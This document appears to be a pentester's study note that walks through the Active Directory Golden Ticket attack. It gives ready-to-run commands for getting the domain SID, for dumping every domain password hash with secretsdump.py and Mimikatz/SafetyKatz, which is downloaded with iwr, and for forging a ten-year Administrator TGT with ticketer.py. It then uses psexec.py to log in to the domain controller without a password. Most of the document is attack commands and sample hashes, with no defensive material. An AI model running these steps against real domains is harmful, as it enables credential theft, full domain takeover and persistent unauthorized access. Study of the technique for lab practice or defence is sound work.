#AD_golden_ticket

> [!info] KRBTGT Account
> KRBTGT is a service account whose hash is used to sign and encrypt Kerberos Ticket Granting Tickets (TGTs).

> [!danger] Golden Ticket
> A **Golden Ticket** is a fake master key that lets an attacker impersonate ANY user in a Windows domain without needing a password.

- **What it is:**  
	- A Golden Ticket is a **fake Kerberos Ticket (TGT)**.
	- It is created using the **KRBTGT account’s secret hash**, so it looks **real to the domain**.
	-  It lets an attacker **log in as any user without a password**.
- **How it works:**  
	- Normally:
	    - User sends login request (AS-REQ)
	    - Domain sends response (AS-REP)
	    - Then user gets a TGT
	- In Golden Ticket attack:
	    - This whole login step is **skipped**
	    - Attacker **creates their own TGT**
	    - Then directly requests access from services (TGS)
- **What you need to make one:**
    1. Domain name
    2. Domain SID
    3. **krbtgt account’s NTLM hash** (hardest to get)
    4. Username you want to impersonate
- **Why it’s dangerous:**
    - You can impersonate **any user** (admin, etc.)
    - You don’t even need to be on the domain network        
    - Works for **lateral movement** (jump between machines) and **persistence** (keep access even if admins reset passwords)


# <span style="color:#FF5555">Steps</span>

___
# <span style="color:#FF5555">1. Gather required information</span>

# <span style="color:#FF5555">Get Domain Name</span>

```cmd
systeminfo
```
![[Pasted image 20260416093323.png]]
# <span style="color:#FF5555">Get Domain SID</span>

#### <span style="color:#FFB86C">Method A (from compromised Windows machine):</span>

```bash
lookupsid.py 'Administrator:P@$$W0rd'@$DC_IP
```

![[Pasted image 20260416093506.png]]
#### <span style="color:#FFB86C">Method A (from Linux, remote):</span>

or if we've already an access to machine (eg. reverse shell) we can execute `whoami /user` (excluding the last 4 chars, eg. `-500`): `S-1-5-21-1954621190-1971745961-1283776715`

```cmd
whoami /user
```
- Example:
    S-1-5-21-XXXXX-XXXXX-XXXXX-500
- Remove last part (`-500`) → that’s your **Domain SID**
![[Pasted image 20260416093356.png]]
# <span style="color:#FF5555">Extract NTLM hash of the KRBTGT account</span>

We can use Impacket or Mimikatz (or a variant) on the **Domain Controller as Domain Admin**:

### <span style="color:#50FA7B">Using Impacket/secretsdump.py</span>

```bash
# This will Dumps all password hashes from the Domain Controller and we will use the krbtgt account hash
secretsdump.py 'Administrator:P@$$W0rd'@$DC_IP -outputfile krb -user-status
```
and consider the 4th part of string after the third ':'
NTLM hash of the KRBTGT account is: `d7ac4db5b820be57cc79f58f196a0e5b`
![[Pasted image 20260416094213.png]]

### <span style="color:#50FA7B">Using Mimikatz</span>
Download and extract Mimikatz:
```powershell
# Download and extract Mimikatz:
iwr -uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip 
Expand-Archive -Path 'mimikatz_trunk.zip' 
cd .\mimikatz_trunk\ 
cd .\x64\

# and run it:
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```
KRBTGT's NTLM: `d7ac4db5b820be57cc79f58f196a0e5b`
![[Pasted image 20260416095758.png]]

### <span style="color:#50FA7B">Using SafetyKatz</span>
```powershell
C:\Users\Administrator\Documents\Tools\SafetyKatz.exe "lsadump::lsa /patch"
```

![[Pasted image 20260416095826.png]]

___
# <span style="color:#FF5555">2. Forge a Golden Ticket</span>

#### <span style="color:#FFB86C">Create the Golden Ticket</span>

Forge the golden ticket using ticketer.py an impacket's script suite, its duration end after 10 yeas from the moment of creation. The command below contain all requirements needed:

- Domain name -> `$DOMAIN`
- Domain SID -> `S-1-5-21-1954621190-1971745961-1283776715`
- NTLM hash of the KRBTGT account -> `d7ac4db5b820be57cc79f58f196a0e5b`
- Username of user that we want to impersonate -> Administrator

```bash
# ticketer.py -nthash <HashValue> -domain-sid <SIDValue> -domain <DomainName> <Username>

ticketer.py -nthash d7ac4db5b820be57cc79f58f196a0e5b -domain-sid S-1-5-21-1954621190-1971745961-1283776715 -domain $DOMAIN Administrator
```

![[Pasted image 20260416093755.png]]

### <span style="color:#50FA7B">Convert Ticket Format</span>

The ticket is saved in Administrator.ccache, if we need to use specific tools we need to convert it to kirbi format

```bash
export KRB5CCNAME=/home/kali/Documents/AD/Administrator.ccache 

ticketConverter.py /home/kali/Documents/AD/Administrator.ccache Administrator.kirbi
```

![[Pasted image 20260416093826.png]]

In this case original .ccache format is compliant with Impacket.
### <span style="color:#50FA7B">Load Ticket into Memory</span>

Tells your Linux system to use this fake ticket instead of real Kerberos authentication.
**What this does:** Any Kerberos tool you run now will automatically use the forged Administrator ticket.
```bash
export KRB5CCNAME=/home/kali/Documents/AD/Administrator.ccache
```

### <span style="color:#50FA7B">Verify Ticket is Loaded</span>
Confirms the fake ticket is loaded and ready to use.
```bash
#If you've not installed krb5 package, install it -> sudo apt install krb5-user 
klist
```

![[Pasted image 20260416094009.png]]

### <span style="color:#50FA7B">Sync Time with Domain Controller</span>
It Forces your computer's clock to match the Domain Controller's clock.
```bash
cat /etc/hosts | grep $DOMAIN 
sudo ntpdate -u $DC_IP 
```

### <span style="color:#50FA7B">Use the Ticket - Remote Access as Administrator</span>

```bash
# psexec.py -k -no-pass <DOMAIN_NAME>/<USER_TO_IMPERSONATE>@<DC_HOSTNAME>.<DOMAIN_NAME>

# Login as administrator user without password using the forged kerberose TGT
psexec.py -k -no-pass $DOMAIN/administrator@$DC_IP
```

![[Pasted image 20260416094102.png]]
